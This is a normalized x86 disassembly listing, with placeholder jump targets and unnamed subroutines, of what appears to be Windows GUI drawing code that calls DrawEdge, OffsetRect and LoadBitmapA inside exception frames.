mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f8c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x22 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425424
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_448c68
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424fb8
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_434ae4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
movzx edx [ r-xdata ]
call sub_424a88
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425714
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4252b0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4246fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_404650
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425714
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_434ae4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx ebx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435685
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_433b40
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_434ae4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_43569c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_435ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x22 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
call sub_432228
call sub_432330
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
call sub_432228
call sub_432330
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424fb8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424fb8
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4246fc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424fb8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_448978
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425714
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424fb0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424fb8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424fb8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424fb0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42b908
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424f8c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x22 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42535c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_435b30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42a5c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4246fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_448978
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424fb8
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_434ae4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
movzx edx [ r-xdata ]
call sub_424a88
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425714
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425424
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_448c68
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425714
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4252b0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4246fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_404650
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
